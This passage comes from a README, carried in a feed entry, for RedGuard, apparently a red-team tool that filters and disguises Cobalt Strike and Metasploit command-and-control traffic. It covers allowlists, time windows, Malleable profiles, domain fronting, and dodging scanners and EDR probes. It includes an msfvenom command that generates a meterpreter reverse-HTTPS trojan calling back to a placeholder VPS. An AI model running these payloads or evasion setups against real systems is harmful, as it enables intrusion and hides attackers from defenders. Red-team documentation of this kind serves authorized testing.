class=&#34;language-bash&#34;&gt;# Whitelist list example: AllowIP = 172.16.1.1,192.168.1.1&#xA;AllowIP       = 127.0.0.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656311197849.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;As shown in the figure above, we only allow 127.0.0.1 to go online, then the request traffic of other IPs will be intercepted.&lt;/p&gt; &#xA;&lt;h2&gt;Block based on time period&lt;/h2&gt; &#xA;&lt;p&gt;This function is more interesting. Setting the following parameter values in the configuration file means that the traffic control facility can only go online from 8:00 am to 9:00 pm. The specific application scenario here is that during the specified attack time, we allow communication with C2 Traffic interacts, and remains silent at other times. This also allows the red teams to get a good night&#39;s sleep without worrying about some blue team on the night shift being bored to analyze your Trojan and then wake up to something indescribable, hahaha.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Limit the time of requests example: AllowTime = 8:00 - 16:00&#xA;AllowTime     = 8:00 - 21：00&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656311327769.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Malleable Profile&lt;/h2&gt; &#xA;&lt;p&gt;RedGuard uses the Malleable C2 profile. It then parses the provided malleable configuration file section to understand the contract and pass only those inbound requests that satisfy it, while misleading others. Parts such as &lt;code&gt;http-stager&lt;/code&gt;, &lt;code&gt;http-get&lt;/code&gt; and &lt;code&gt;http-post&lt;/code&gt; and their corresponding uris, headers, User-Agent etc. are used to distinguish legitimate beacon requests from irrelevant Internet noise or IR/AV/EDR Out-of-bounds packet.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# C2 Malleable File Path&#xA;MalleableFile = /root/cobaltstrike/Malleable.profile&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656311591693.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The profile written by 风起 is recommended to use:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://github.com/wikiZ/CobaltStrike-Malleable-Profile&#34;&gt;https://github.com/wikiZ/CobaltStrike-Malleable-Profile&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;0x04 Case Study&lt;/h1&gt; &#xA;&lt;h2&gt;Cyberspace Search Engine&lt;/h2&gt; &#xA;&lt;p&gt;As shown in the figure below, when our interception rule is set to DROP, the spatial mapping system probe will probe the / directory of our reverse proxy port several times. In theory, the request packet sent by mapping is faked as normal traffic. Show. But after several attempts, because the characteristics of the request packet do not meet the release requirements of RedGuard, they are all responded by Close HTTP. The final effect displayed on the surveying and mapping platform is that the reverse proxy port is not open.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656312184116.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The traffic shown in the figure below means that when the interception rule is set to Redirect, we will find that when the mapping probe receives a response, it will continue to scan our directory. UserAgent is random, which seems to be in line with normal traffic requests, but both successfully blocked.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656312557035.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Mapping Platform - Hijack Response Intercept Mode Effect:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656313188878.png&#34; alt=&#34;1653200439(1).jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Surveying and mapping platform - effect of redirection interception:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656406644535.jpg&#34; alt=&#34;1653200439(1).jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Domain fronting&lt;/h2&gt; &#xA;&lt;p&gt;RedGuard supports Domain fronting. In my opinion, there are two forms of presentation. One is to use the traditional Domain fronting method, which can be achieved by setting the port of our reverse proxy in the site-wide acceleration back-to-source address. On the original basis, the function of traffic control is added to the domain fronting, and it can be redirected to the specified URL according to the setting we set to make it look more real. It should be noted that the RedGuard setting of the HTTPS HOST header must be consistent with the domain name of the site-wide acceleration.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522143012-a26ab442-d998-1.png&#34; alt=&#34;1653201007(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;In individual combat, I suggest that the above method can be used, and in team tasks, it can also be achieved by self-built &#34;Domain fronting&#34;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522143837-cf77a944-d999-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;In the self-built Domain fronting, keep multiple reverse proxy ports consistent, and the HOST header consistently points to the real C2 server listening port of the backend. In this way, our real C2 server can be well hidden, and the server of the reverse proxy can only open the proxy port by configuring the firewall.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656313773114.jpg&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This can be achieved through multiple node servers, and configure multiple IPs of our nodes in the CS listener HTTPS online IP.&lt;/p&gt; &#xA;&lt;h2&gt;CobaltStrike&lt;/h2&gt; &#xA;&lt;p&gt;If there is a problem with the above method, the actual online C2 server cannot be directly intercepted by the firewall, because the actual load balancing request in the reverse proxy is made by the IP of the cloud server manufacturer.&lt;/p&gt; &#xA;&lt;p&gt;If it is a single soldier, we can set an interception strategy on the cloud server firewall.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522150356-58b9586c-d99d-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Then set the address pointed to by the proxy to &lt;a href=&#34;https://127.0.0.1:4433&#34;&gt;https://127.0.0.1:4433&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;{&#34;360.net&#34;:&#34;http://127.0.0.1:8080&#34;,&#34;360.com&#34;:&#34;https://127.0.0.1:4433&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And because our basic verification is based on the HTTP HOST request header, what we see in the HTTP traffic is also the same as the domain fronting method, but the cost is lower, and only one cloud server is needed.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522150942-26f6c264-d99e-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;For the listener settings, the online port is set to the RedGuard reverse proxy port, and the listening port is the actual online port of the local machine.&lt;/p&gt; &#xA;&lt;h2&gt;Metasploit&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Generates Trojan&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com &#xA;-f exe -o ~/path/to/payload.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Of course, as a domain fronting scenario, you can also configure your LHOST to use any domain name of the manufacturer&#39;s CDN, and pay attention to setting the HttpHostHeader to match RedGuard.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;setg OverrideLHOST 360.com&#xA;setg OverrideLPORT 443&#xA;setg OverrideRequestHost true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is important to note that the &lt;code&gt;OverrideRequestHost&lt;/code&gt; setting must be set to &lt;code&gt;true&lt;/code&gt;. This is due to a quirk in the way Metasploit handles incoming HTTP/S requests by default when generating configuration for staging payloads. By default, Metasploit uses the incoming request&#39;s &lt;code&gt;Host&lt;/code&gt; header value (if present) for second-stage configuration instead of the &lt;code&gt;LHOST&lt;/code&gt; parameter. Therefore, the build stage is configured to send requests directly to your hidden domain name because CloudFront passes your internal domain in the &lt;code&gt;Host&lt;/code&gt; header of forwarded requests. This is clearly not what we are asking for. Using the &lt;code&gt;OverrideRequestHost&lt;/code&gt; configuration value, we can force Metasploit to ignore the incoming &lt;code&gt;Host&lt;/code&gt; header and instead use the &lt;code&gt;LHOST&lt;/code&gt; configuration value pointing to the origin CloudFront domain.&lt;/p&gt; &#xA;&lt;p&gt;The listener is set to the actual line port that matches the address RedGuard actually forwards to.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png&#34; alt=&#34;867551fe860b10ca1396498a85422b4.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;RedGuard received the request:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png&#34; alt=&#34;867551fe860b10ca1396498a85422b4.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;0x05 Loading&lt;/h1&gt; &#xA;&lt;p&gt;Thank you for your support. RedGuard will continue to improve and update it. I hope that RedGuard can be known to more security practitioners. The tool refers to the design ideas of RedWarden.&lt;/p&gt; &#xA;&lt;p&gt;**We welcome everyone to put forward your needs, RedGuard will continue to grow and improve in these needs! **&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;About the developer 风起 related articles:&lt;a href=&#34;https://www.anquanke.com/member.html?memberId=148652&#34;&gt;https://www.anquanke.com/member.html?memberId=148652&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Kunyu: &lt;a href=&#34;https://github.com/knownsec/Kunyu&#34;&gt;https://github.com/knownsec/Kunyu&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;风起于青萍之末，浪成于微澜之间。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;0x06 Community&lt;/h1&gt; &#xA;&lt;p&gt;If you have any questions or requirements, you can submit an issue under the project, or contact the tool author by adding WeCat.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522141706-ce37e178-d996-1.png&#34; alt=&#34;867551fe860b10ca1396498a85422b4.jpg&#34;&gt;&lt;/p&gt;</summary>
  </entry>
</feed>